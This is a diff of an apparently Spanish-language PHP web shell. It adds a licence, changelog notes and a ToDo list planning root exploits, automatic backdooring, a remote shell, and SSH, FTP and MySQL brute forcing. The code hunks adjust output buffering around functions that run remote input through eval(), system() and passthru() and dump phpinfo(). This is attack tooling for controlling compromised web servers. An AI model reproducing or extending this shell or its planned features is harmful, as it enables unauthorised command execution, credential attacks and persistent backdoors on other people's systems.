@@ -24,12 +24,40 @@
   http://foro.undersecurity.net/
   http://0verl0ad.blogspot.com/
   
+  
+  Copyright (c) 2009 2010, EMeLCo
+  All rights reserved.
+ 
+  Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:
+ 
+      * Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
+      * Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
+      * Neither the name of the authors nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.
+
+  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
+ 
   Changelog:
   1.0
    [!] Arreglado un loop infinito en shellpopen() que se producia cuando no se podia ejecutar el comando por safe_mode
    [!] No se muestran los resultados vacios de la ejecución de comandos en ?w=info
    [!] Mejorada la lectura de archivos con readfile() y file()
    [!] Ya no se muestra la contraseña al ingresarla
+   [!] Arreglado bug que saltaba cuando output_buffering era distinto a Off
+   
+   ToDo:
+   [+] Agregar rootexploits
+   [+] Agregar exploits de php
+   [+] Agregar una shell remota tipo datacha0s
+   [+] Agregar backdoorizacion automática
+   [+] Agregar descripciones en los textarea e input--> onfocus="this.value=''; this.onfocus=null;"
+   [!] Eliminar un input del editor de archivos
+   [!] Mejorar las funciones para leer y escribir archivos
+   [+] Agregar brute force de ssh
+   [+] Agregar brute force de ftp
+   [+] Agregar brute force de mysql
+   [+] Agregar navegador de sql
+   [+] Agregar para mover y copiar los archivos
+   [+] Ejecutar comandos con http://us3.php.net/manual/en/function.pcntl-exec.php y http://ar2.php.net/manual/en/function.proc-open.php
  
 */
 
@@ -338,6 +366,7 @@ switch($_GET["w"]){
         /* Este div tiene un estilo unico para el phpinfo */
         echo '<div id="phpinfo">';
         /* All your phpinfo() are belog to us */
+        ob_flush();
         ob_start();
             phpinfo();
             $phpinfo = ob_get_clean();
@@ -684,6 +713,7 @@ psybnc.conf
         
         if (isset($_POST["codigo"])){
             $cmd = $_POST["codigo"];
+            ob_flush();
             ob_start();
                 eval($cmd);
                 $salida = ob_get_clean();
@@ -1126,6 +1156,7 @@ function shellpopen($cmd){
   }
 }
 function systemreturn($cmd){
+    ob_flush();
     ob_start();
         system($cmd);
         $salida = ob_get_clean();
@@ -1133,6 +1164,7 @@ function systemreturn($cmd){
     return $salida;
 }
 function passthrureturn($cmd){
+    ob_flush();
     ob_start();
         passthru($cmd);
         $salida = ob_get_clean();
